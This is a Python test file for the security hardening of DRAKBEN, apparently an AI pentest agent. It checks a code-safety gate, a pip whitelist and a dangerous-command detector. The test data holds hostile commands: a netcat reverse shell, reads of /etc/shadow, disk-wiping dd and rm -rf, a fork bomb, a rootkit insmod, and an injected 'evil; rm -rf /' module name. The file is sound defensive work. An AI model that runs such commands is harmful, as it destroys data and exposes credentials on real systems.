"""Tests for security hardening features added to the DRAKBEN project.

Covers:
- Singularity Engine AST safety gate (_ast_is_safe)
- Healer pip whitelist
- Brain SelfCorrection dangerous patterns expansion
"""

from __future__ import annotations

import pytest

from core.agent.brain import SelfCorrection
from core.singularity.engine import _ast_is_safe

# ---------------------------------------------------------------------------
# Singularity Engine — _ast_is_safe
# ---------------------------------------------------------------------------


class TestAstIsSafe:
    """AST-level safety validation for generated code."""

    def test_safe_code(self):
        code = "x = 1 + 2\nprint(x)"
        safe, reason = _ast_is_safe(code)
        assert safe is True
        assert reason == ""

    def test_safe_import_requests(self):
        code = "import requests\nrequests.get('http://example.com')"
        safe, _ = _ast_is_safe(code)
        assert safe is True

    def test_blocks_os_import(self):
        code = "import os\nos.system('rm -rf /')"
        safe, reason = _ast_is_safe(code)
        assert safe is False
        assert "system" in reason  # os.system() blocked by _DANGEROUS_CALLS

    def test_blocks_subprocess_import(self):
        code = "import subprocess\nsubprocess.call('ls')"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "subprocess" in _

    def test_blocks_shutil_import(self):
        code = "import shutil\nshutil.rmtree('/tmp')"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "shutil" in _

    def test_blocks_from_os_import(self):
        code = "from os import system"
        safe, reason = _ast_is_safe(code)
        assert safe is False
        assert "system" in reason  # from os import system blocked

    def test_blocks_from_subprocess_import(self):
        code = "from subprocess import Popen"
        safe, _ = _ast_is_safe(code)
        assert safe is False

    def test_blocks_eval_call(self):
        code = "eval('print(1)')"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "eval" in _

    def test_blocks_exec_call(self):
        code = "exec('x = 1')"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "exec" in _

    def test_blocks_system_call(self):
        code = "system('ls')"
        safe, _ = _ast_is_safe(code)
        assert safe is False

    def test_blocks_compile_call(self):
        code = "compile('x=1', '<string>', 'exec')"
        safe, _ = _ast_is_safe(code)
        assert safe is False

    def test_syntax_error(self):
        code = "def foo(:\npass"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "SyntaxError" in _

    def test_empty_code(self):
        safe, _ = _ast_is_safe("")
        assert safe is True

    def test_safe_complex_code(self):
        code = """
import json
import hashlib
from collections import defaultdict

def process(data):
    result = defaultdict(list)
    for item in data:
        h = hashlib.sha256(json.dumps(item).encode()).hexdigest()
        result[h[:8]].append(item)
    return dict(result)
"""
        safe, _ = _ast_is_safe(code)
        assert safe is True

    def test_blocks_ctypes_import(self):
        code = "import ctypes"
        safe, _ = _ast_is_safe(code)
        assert safe is False
        assert "ctypes" in _

    def test_attribute_system_call(self):
        """os.system via attribute should be blocked."""
        code = "import json\njson.system('ls')"  # system() is in blacklist regardless of module
        safe, _ = _ast_is_safe(code)
        assert safe is False

    def test_blocks_rmtree_call(self):
        code = "rmtree('/important')"
        safe, _ = _ast_is_safe(code)
        assert safe is False

    def test_blocks_remove_call(self):
        code = "remove('/etc/hosts')"
        safe, _ = _ast_is_safe(code)
        assert safe is False


# ---------------------------------------------------------------------------
# Healer pip whitelist
# ---------------------------------------------------------------------------


class TestHealerWhitelist:
    """Healer._heal_python_module_missing whitelist enforcement."""

    def _make_healer(self):
        from unittest.mock import MagicMock

        from core.agent.recovery.healer import SelfHealer

        executor = MagicMock()
        console = MagicMock()
        return SelfHealer(executor, console)

    def test_whitelisted_module_allowed(self):
        healer = self._make_healer()
        # requests is in the whitelist
        diagnosis = {"module": "requests"}
        # Will attempt pip install (which may fail in test env)
        # but should NOT be blocked by the whitelist
        result, _ = healer._heal_python_module_missing(
            "test_tool",
            "import requests",
            diagnosis,
        )
        # It proceeds past the whitelist check (may succeed or fail at pip)
        # We just verify it doesn't return False with "not in safe whitelist"
        # Since pip install could fail, we accept both True and False
        assert isinstance(result, bool)

    def test_unknown_module_blocked(self):
        healer = self._make_healer()
        diagnosis = {"module": "evil_package_xyz"}
        result, _ = healer._heal_python_module_missing(
            "test_tool",
            "import evil_package_xyz",
            diagnosis,
        )
        assert result is False
        assert _ is None

    def test_no_module_name(self):
        healer = self._make_healer()
        diagnosis: dict[str, str] = {}
        result, _ = healer._heal_python_module_missing(
            "test_tool",
            "import ???",
            diagnosis,
        )
        assert result is False

    def test_suspicious_module_name_rejected(self):
        healer = self._make_healer()
        diagnosis = {"module": "evil; rm -rf /"}
        result, _ = healer._heal_python_module_missing(
            "test_tool",
            "cmd",
            diagnosis,
        )
        assert result is False


# ---------------------------------------------------------------------------
# Brain SelfCorrection — expanded dangerous patterns
# ---------------------------------------------------------------------------


class TestSelfCorrectionDangerousPatterns:
    """Expanded _DANGEROUS_PATTERNS frozenset."""

    def setup_method(self):
        self.sc = SelfCorrection()

    def test_rm_rf_root(self):
        d = {"command": "rm -rf /"}
        assert self.sc._is_dangerous(d) is True

    def test_fork_bomb(self):
        d = {"command": ":(){ :|:& };:"}
        assert self.sc._is_dangerous(d) is True

    def test_dd_if(self):
        d = {"command": "dd if=/dev/zero of=/dev/sda"}
        assert self.sc._is_dangerous(d) is True

    def test_chmod_777(self):
        d = {"command": "chmod 777 /etc/passwd"}
        assert self.sc._is_dangerous(d) is True

    def test_chmod_recursive_777(self):
        d = {"command": "chmod -R 777 /var"}
        assert self.sc._is_dangerous(d) is True

    def test_shred(self):
        d = {"command": "shred /dev/sda"}
        assert self.sc._is_dangerous(d) is True

    def test_cat_shadow(self):
        d = {"command": "cat /etc/shadow"}
        assert self.sc._is_dangerous(d) is True

    def test_nc_reverse(self):
        d = {"command": "nc -e /bin/sh 10.0.0.1 4444"}
        assert self.sc._is_dangerous(d) is True

    def test_windows_del(self):
        d = {"command": "del /f /s /q C:\\"}
        assert self.sc._is_dangerous(d) is True

    def test_windows_rd(self):
        d = {"command": "rd /s /q C:\\Windows"}
        assert self.sc._is_dangerous(d) is True

    def test_insmod(self):
        d = {"command": "insmod rootkit.ko"}
        assert self.sc._is_dangerous(d) is True

    def test_safe_command(self):
        d = {"command": "nmap -sV 10.0.0.1"}
        assert self.sc._is_dangerous(d) is False

    def test_empty_command(self):
        d = {"command": ""}
        assert self.sc._is_dangerous(d) is False

    def test_no_command_key(self):
        d = {"action": "scan"}
        assert self.sc._is_dangerous(d) is False

    def test_patterns_is_frozenset(self):
        """Ensure patterns is frozenset (immutable)."""
        assert isinstance(SelfCorrection._DANGEROUS_PATTERNS, frozenset)

    def test_review_flags_dangerous(self):
        """review() should flag dangerous command for approval."""
        result = self.sc.review({"command": "rm -rf /"})
        assert result.get("needs_approval") is True
        assert result.get("safety_warning") is not None

    def test_review_safe_command(self):
        result = self.sc.review({"command": "nmap -sV target"})
        assert result.get("needs_approval") is None or result.get("needs_approval") is not True

    def test_correction_stats(self):
        self.sc.review({"command": "rm -rf /"})
        stats = self.sc.get_correction_stats()
        assert stats["total_corrections"] >= 1


# ================================================================== HealingStats
class TestHealingStats:
    """Tests for HealingStats success rate tracking."""

    def test_initial_state(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        assert stats.total_attempts == 0
        assert stats.successful_heals == 0
        assert stats.failed_heals == 0
        assert stats.success_rate == pytest.approx(0.0)

    def test_record_success(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        stats.record("missing_tool", True)
        assert stats.total_attempts == 1
        assert stats.successful_heals == 1
        assert stats.failed_heals == 0
        assert stats.success_rate == pytest.approx(100.0)

    def test_record_failure(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        stats.record("timeout", False)
        assert stats.total_attempts == 1
        assert stats.successful_heals == 0
        assert stats.failed_heals == 1
        assert stats.success_rate == pytest.approx(0.0)

    def test_mixed_outcomes(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        stats.record("missing_tool", True)
        stats.record("missing_tool", True)
        stats.record("timeout", False)
        stats.record("connection_error", True)
        assert stats.total_attempts == 4
        assert stats.successful_heals == 3
        assert stats.failed_heals == 1
        assert stats.success_rate == pytest.approx(75.0)

    def test_by_error_type_tracking(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        stats.record("missing_tool", True)
        stats.record("missing_tool", False)
        stats.record("timeout", True)
        assert stats.by_error_type["missing_tool"]["attempts"] == 2
        assert stats.by_error_type["missing_tool"]["successes"] == 1
        assert stats.by_error_type["timeout"]["attempts"] == 1
        assert stats.by_error_type["timeout"]["successes"] == 1

    def test_get_report(self):
        from core.agent.recovery.healer import HealingStats

        stats = HealingStats()
        stats.record("missing_tool", True)
        stats.record("timeout", False)
        report = stats.get_report()
        assert report["total_attempts"] == 2
        assert report["successful_heals"] == 1
        assert report["failed_heals"] == 1
        assert report["success_rate"] == pytest.approx(50.0)
        assert "missing_tool" in report["by_error_type"]

    def test_healer_stats_integration(self):
        """SelfHealer.apply_healing records stats."""
        from unittest.mock import MagicMock

        from core.agent.recovery.healer import SelfHealer

        executor = MagicMock()
        healer = SelfHealer(executor, MagicMock())

        # Unknown error type → not healed, not recorded (no handler)
        healer.apply_healing({"type": "unknown"}, "tool1", "cmd1")
        assert healer.stats.total_attempts == 0  # unknown has no handler

        # Known type with mock executor
        executor.terminal.execute.return_value = MagicMock(exit_code=0)
        healer.apply_healing({"type": "connection_error"}, "nmap", "nmap -sV x")
        assert healer.stats.total_attempts == 1
        report = healer.get_healing_stats()
        assert report["total_attempts"] == 1
